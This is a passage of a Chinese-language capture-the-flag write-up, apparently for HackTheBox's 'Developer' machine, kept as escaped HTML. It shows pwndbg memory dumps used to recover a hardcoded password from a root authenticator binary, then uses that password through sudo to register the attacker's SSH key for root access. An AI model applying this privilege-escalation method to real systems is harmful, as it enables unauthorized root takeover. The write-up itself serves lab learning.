language-bash\"\u003eD5F5F4BE3DD4209E6191795C3432E8A3\n6A812006DC5598A79A95D2D9E3591F76\n//\nA3E832345C7991619E20D43DBEF4F5D5\n761F59E3D9D2959AA79855DC0620816A\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image32.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们将加密和解密函数准备好\u003c/p\u003e\n\u003cp\u003e再到下边（代码喂给\u003ccode\u003eAI\u003c/code\u003e），首先会判断明文长度是否等于\u003ccode\u003e32\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( size[1] == 32\n    \u0026#x26;\u0026#x26; (ptr == (u8 *)v5\n     || _mm_movemask_epi8(\n          _mm_and_si128(\n            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e), _mm_loadu_si128(v5 + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)),\n            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr), _mm_loadu_si128(v5)))) == 0xFFFF) )\n  {\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image33.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eptr\u003c/code\u003e (我们的解密结果) 的地址被加载到了 \u003ccode\u003eRAX\u003c/code\u003e 寄存器。\u003ccode\u003ev5\u003c/code\u003e (程序内置的目标明文) 的地址被加载到了 \u003ccode\u003eR15\u003c/code\u003e 寄存器。\u003c/p\u003e\n\u003cp\u003e通过调试确认一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e b main\npwndbg\u003e r\npwndbg\u003e b *0x55555555b9b9\nBreakpoint 2 at 0x55555555b9b9\npwndbg\u003e c\nContinuing.\nWelcome to TheCyberGeek\u003cspan class=\"hljs-string\"\u003e's super secure login portal!\nEnter your password to access the super user:\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA //因为期待解密后明文长度是32因此输入32个A\npwndbg\u003e hexdump $rax 32 //获取RAX的值\n+0000 0x5555555b7dd0  ed 2f 17 c5 87 44 a4 d8  5c a2 c9 6b d4 69 18 22  │./...D..│\\..k.i.\"│\n+0010 0x5555555b7de0  69 86 ec f4 c8 2c 84 de  d8 c1 dc 4b ec 57 6e 44  │i....,..│...K.WnD│\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Developer awk \u003cspan class=\"hljs-string\"\u003e'{for(i=3;i\u0026#x3C;=18;i++) printf $i}'\u003c/span\u003e rax\ned2f17c58744a4d85ca2c96bd46918226986ecf4c82c84ded8c1dc4bec576e44#    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image34.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e解密成功，那么\u003ccode\u003eR15\u003c/code\u003e的值应该就是我们需要的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e hexdump \u003cspan class=\"hljs-variable\"\u003e$r15\u003c/span\u003e 32\n+0000 0x5555555b7c20  fe 1b 25 f0 80 6a 97 ca  78 80 fd 58 \u003cspan class=\"hljs-built_in\"\u003efc\u003c/span\u003e 5c 20 23  │..%..j..│x..X.\\.#│\n+0010 0x5555555b7c30  6c a2 db d0 e5 02 b5 fa  eb c0 af 3a 9f 27 15 2c  │l.......│...:.\u003cspan class=\"hljs-string\"\u003e'.,│\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Developer awk \u003cspan class=\"hljs-string\"\u003e'{for(i=3;i\u0026#x3C;=18;i++) printf $i}'\u003c/span\u003e r15\nfe1b25f0806a97ca7880fd58fc5c20236ca2dbd0e502b5faebc0af3a9f27152c#   \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Developer/image35.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到重点\u003ccode\u003eRustForSecurity@Developer@2021:)\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e我们到\u003ccode\u003ekarl\u003c/code\u003e的\u003ccode\u003eshell\u003c/code\u003e中运行程序，会让我们输入我们的公钥\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ekarl@developer:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /root/.auth/authenticator \n[\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e karl: \nWelcome to TheCyberGeek\u003cspan class=\"hljs-string\"\u003e's super secure login portal!\nEnter your password to access the super user: \nRustForSecurity@Developer@2021:)\nYou have successfully authenticated\nEnter your SSH public key in now:\nssh-xxxxx AAAAC3NzxxxxxxxJqSEDwP6SCfe root@kali\nYou may now authenticate as root!\n\u003c/span\u003e
